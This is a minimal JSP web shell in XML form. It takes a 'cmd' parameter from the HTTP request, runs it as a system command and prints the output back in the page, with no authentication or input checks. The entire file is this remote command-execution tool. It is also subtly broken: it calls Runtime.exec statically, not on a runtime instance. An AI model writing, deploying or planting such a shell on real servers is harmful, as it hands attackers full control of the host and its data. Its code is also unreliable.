<jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page">
    <jsp:directive.page import="java.io.*"/>
        <jsp:scriptlet> 
            String cmd = request.getParameter("cmd");
            String output = "";
            if(cmd!=null){
                String s = null;
                try{
                    Process p = Runtime.exec(cmd);
                    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    while((s= sI.readLine()) != null) {
                        output+=s + "\r\n";
                        }
                    }
                catch(IOException e){
                    e.printStackTrace();
                    } 
            }
        </jsp:scriptlet>
    <jsp:expression>
	    output
    </jsp:expression>
</jsp:root>
